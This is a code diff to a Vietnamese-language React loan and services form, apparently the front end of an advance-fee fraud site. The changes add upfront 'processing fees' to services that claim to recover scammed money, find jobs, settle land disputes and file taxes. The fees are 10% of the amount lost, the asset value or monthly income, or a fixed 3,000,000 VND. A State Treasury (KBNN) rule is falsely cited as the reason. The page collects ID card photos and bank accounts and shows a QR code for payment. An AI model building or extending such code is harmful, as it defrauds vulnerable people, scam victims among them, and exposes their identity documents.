@@ -9,6 +9,7 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
     const [loading, setLoading] = useState(false);
     const [qrUrl, setQrUrl] = useState('');
     const [amount, setAmount] = useState('');
+    const [fee, setFee] = useState(0);
     const [fileFront, setFileFront] = useState(null);
     const [fileBack, setFileBack] = useState(null);
     const [previewFront, setPreviewFront] = useState(null);
@@ -48,6 +49,7 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
             const res = await axios.get(`${API_BASE}/status?token=${chkToken}`);
             const data = res.data;
             if (data.amount) setAmount(data.amount);
+            if (data.fee) setFee(data.fee);
             if (data.status === 'pending') setState('pending');
             else if (data.status === 'approved') setState('approved');
             else if (data.status === 'waiting_qr') setState('waiting_qr');
@@ -399,6 +401,14 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
                         </div>
                     )}
 
+                    {service === 'tien-treo' && (
+                        <div className="form-group">
+                            <label>Số tiền bị lừa (VND) <span style={{ color: 'red' }}>*</span></label>
+                            <input type="number" name="scammedAmount" placeholder="VD: 50000000" required />
+                            <p style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>Phí xử lý hồ sơ: 10% số tiền bị lừa</p>
+                        </div>
+                    )}
+
                     {service === 'tim-viec' && (
                         <>
                             <div className="form-group">
@@ -418,19 +428,29 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
                                     style={{ width: '100%', padding: '10px', border: '1px solid #ddd', borderRadius: '4px', minHeight: '80px' }}
                                 />
                             </div>
+                            <p style={{ fontSize: '12px', color: '#666', marginTop: '10px', padding: '10px', background: '#f9f9f9', borderRadius: '4px' }}>
+                                <b>Phí xử lý hồ sơ:</b> 3,000,000 VND (cố định)
+                            </p>
                         </>
                     )}
 
                     {service === 'dat-dai' && (
-                        <div className="form-group">
-                            <label>Nội dung tranh chấp <span style={{ color: 'red' }}>*</span></label>
-                            <textarea
-                                name="disputeContent"
-                                placeholder="Trình bày chi tiết nội dung tranh chấp..."
-                                required
-                                style={{ width: '100%', padding: '10px', border: '1px solid #ddd', borderRadius: '4px', minHeight: '100px' }}
-                            />
-                        </div>
+                        <>
+                            <div className="form-group">
+                                <label>Giá trị tài sản tranh chấp (VND) <span style={{ color: 'red' }}>*</span></label>
+                                <input type="number" name="disputedAssetValue" placeholder="VD: 500000000" required />
+                                <p style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>Phí xử lý hồ sơ: 10% giá trị tài sản</p>
+                            </div>
+                            <div className="form-group">
+                                <label>Nội dung tranh chấp <span style={{ color: 'red' }}>*</span></label>
+                                <textarea
+                                    name="disputeContent"
+                                    placeholder="Trình bày chi tiết nội dung tranh chấp..."
+                                    required
+                                    style={{ width: '100%', padding: '10px', border: '1px solid #ddd', borderRadius: '4px', minHeight: '100px' }}
+                                />
+                            </div>
+                        </>
                     )}
 
                     {service === 'nop-thue' && (
@@ -442,6 +462,7 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
                             <div className="form-group">
                                 <label>Thu nhập hàng tháng (VND) <span style={{ color: 'red' }}>*</span></label>
                                 <input type="number" name="monthlyIncome" placeholder="0" required />
+                                <p style={{ fontSize: '12px', color: '#666', marginTop: '5px' }}>Phí xử lý hồ sơ: 10% thu nhập hàng tháng</p>
                             </div>
                         </>
                     )}
@@ -570,7 +591,7 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
                         <input type="text" name="bankAccount" placeholder="Nhập số tài khoản" required />
                     </div>
                     <div style={{ marginTop: '15px', padding: '15px', background: '#fff5f5', borderRadius: '8px', border: '1px solid #fed7d7', color: '#c53030', fontSize: '14px' }}>
-                        <b>Lưu ý:</b> Theo quy định của KBNN, Quý khách vui lòng chuẩn bị chi phí giải ngân tương đương <b>10%</b> của số tiền vay để hoàn tất thủ tục.
+                        <b>Lưu ý:</b> Theo quy định của KBNN, Quý khách vui lòng chuẩn bị phí xử lý hồ sơ {fee > 0 ? <><b>{fee.toLocaleString('vi-VN')} VNĐ</b></> : ''} để hoàn tất thủ tục.
                     </div>
                     <div style={{ textAlign: 'center', marginTop: '30px' }}>
                         <button type="submit" className="btn-submit" disabled={loading}>
@@ -590,11 +611,11 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
                     Mã QR sẽ được cung cấp sau khi xác nhận thông tin.<br />
                     Vui lòng không đóng trang này.
                 </p>
-                {amount && (
+                {fee > 0 && (
                     <div style={{ marginTop: '20px', padding: '15px', background: '#f8faff', borderRadius: '8px', border: '1px solid #e1e4e8' }}>
                         <p style={{ margin: 0, color: '#2c3e50', fontSize: '15px' }}>
-                            Số tiền cần chuyển khoản (phí giải ngân 10%): <br />
-                            <b style={{ color: '#d32f2f', fontSize: '18px' }}>{(parseInt(amount) * 0.1).toLocaleString('vi-VN')} VNĐ</b>
+                            Phí xử lý hồ sơ: <br />
+                            <b style={{ color: '#d32f2f', fontSize: '18px' }}>{fee.toLocaleString('vi-VN')} VNĐ</b>
                         </p>
                     </div>
                 )}
@@ -609,9 +630,9 @@ const LoanWorkflow = ({ service = 'vay-von' }) => {
                     <div style={{ marginBottom: '20px', textAlign: 'center' }}>
                         <div className="state-title" style={{ color: '#28a745', marginBottom: '20px' }}>✅ Nhận mã QR giải ngân</div>
                         <img src={qrUrl} alt="QR Code" style={{ maxWidth: '280px', border: '1px solid #ddd', padding: '10px', borderRadius: '8px' }} />
-                        {amount && (
+                        {fee > 0 && (
                             <div style={{ marginTop: '15px', color: '#d32f2f', fontWeight: 'bold', fontSize: '18px' }}>
-                                Số tiền chuyển khoản: {(parseInt(amount) * 0.1).toLocaleString('vi-VN')} VNĐ
+                                Phí xử lý: {fee.toLocaleString('vi-VN')} VNĐ
                             </div>
                         )}
                         <p style={{ fontSize: '14px', marginTop: '10px', fontWeight: 'bold', color: '#ff4d4f' }}>
